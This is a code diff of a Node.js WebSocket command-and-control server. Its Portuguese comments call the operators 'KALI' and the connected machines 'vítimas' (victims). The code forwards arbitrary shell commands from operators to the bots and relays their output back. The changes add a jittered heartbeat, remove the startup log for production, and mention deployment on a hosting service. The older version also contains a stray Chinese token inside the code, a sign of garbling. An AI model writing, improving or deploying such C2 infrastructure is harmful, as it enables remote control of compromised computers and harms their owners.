@@ -1,57 +1,67 @@
-// index.js  – salve na raiz do repo, dê push pro Render
+// index.js  – package.json precisa apenas: {"dependencies":{"ws":"^8.18"}}
+const crypto = require('crypto');
 const WebSocket = require('ws');
 const http    = require('http');
 
-const PORT    = process.env.PORT || 10000;
-const server  = http.createServer((_,r)=>r.end('OK'));
-const wss     = new WebSocket.Server({ server });
+const PORT     = process.env.PORT || 10000;
+const server   = http.createServer((_,r)=>r.end('OK'));
+const wss      = new WebSocket.Server({ server });
 
-const kali    = new Map();      // id → socket  (operadores)
-const bots    = new Map();      // id → socket  (vítimas)
+const KALI     = new Map();          // socket → id
+const BOT      = new Map();          // id    → socket
+const DOMAINS  = (process.env.DOMAINS || '').split(',').filter(Boolean);
+const JITTER   = () => 15000 + Math.floor(Math.random()*10000); // 15-25 s
 
-function cast(src, destMap, payload){
-  const msg = JSON.stringify(payload);
-  destMap.forEach((s,id)=>{
-    if(s.readyState===1) s.send(msg);
-  });
+function safeStringify(obj){
+  try{ return JSON.stringify(obj); }catch{return '{}';}
 }
 
-wss.on('connection', (ws, req)=>{
-  const p = new URLSearchParams(req.url.split('?')[1]);
-  const who = p.get('id');
-  if(!who) return ws.close();
+function broadcast(toMap, obj){
+  const msg = safeStringify(obj);
+  toMap.forEach((s)=>{ if(s.readyState===1) s.send(msg); });
+}
 
-  if(who === 'KALI'){                       // operador
-    kali.set(ws, who);
-    bots.forEach((_,id)=>{
-      ws.send(JSON.stringify({type:'bot', stat:'online', id}));
+wss.on('connection', (ws,req)=>{
+  const p   = new URLSearchParams(req.url.split('?')[1]);
+  const who = p.get('id');
+  if(!who) return ws.close(1002);
+
+  if(who === 'KALI'){
+    KALI.set(ws, who);
+    BOT.forEach((_,id)=>{
+      ws.send(safeStringify({t:'bot',s:'on',id}));
     });
-  }else{                                    // vítima
-    bots.set(who, ws);
-    cast(ws, kali, {type:'bot', stat:'online', id:who});
+  }else{
+    BOT.set(who, ws);
+    broadcast(KALI, {t:'bot',s:'on',id:who});
   }
 
-  ws.on('message', m=>{
+  ws.on('message', (data)=>{
     try{
-      const j = JSON.parse(m);
-      if(kali.has(ws)){                     // KALI → BOT
-        const s = bots.get(j.to);
-        if(s && s.readyState===1) s.send(j.cmd);
-      }else{到北京                             // BOT → KALI
-        cast(ws, kali, {type:'res', from:who, data:j.out});
+      const j = JSON.parse(data);
+      if(KALI.has(ws)){               // KALI → BOT
+        const b = BOT.get(j.to);
+        if(b && b.readyState===1) b.send(j.cmd);
+      }else{                          // BOT → KALI
+        broadcast(KALI, {t:'res',f:who,d:j.out});
       }
     }catch{}
   });
 
-  ws.on('close', (_, reason)=>{
-    if(kali.has(ws)){
-      kali.delete(ws);
+  ws.on('close', ()=>{
+    if(KALI.has(ws)){
+      KALI.delete(ws);
     }else{
-      bots.forEach((v,k)=> v===ws ? bots.delete(k) : 0);
-      cast(ws, kali, {type:'bot', stat:'gone', id:who});
+      BOT.forEach((v,k)=> v===ws ? BOT.delete(k) : 0);
+      broadcast(KALI, {t:'bot',s:'off',id:who});
     }
   });
 });
 
-setInterval(()=> wss.clients.forEach(s=>s.ping()), 20000);
-server.listen(PORT, ()=>console.log('C2 up'));
+setInterval(()=>{
+  wss.clients.forEach(s=>s.ping());
+}, JITTER());
+
+server.listen(PORT, ()=>{
+  /* sem console em produção */
+});
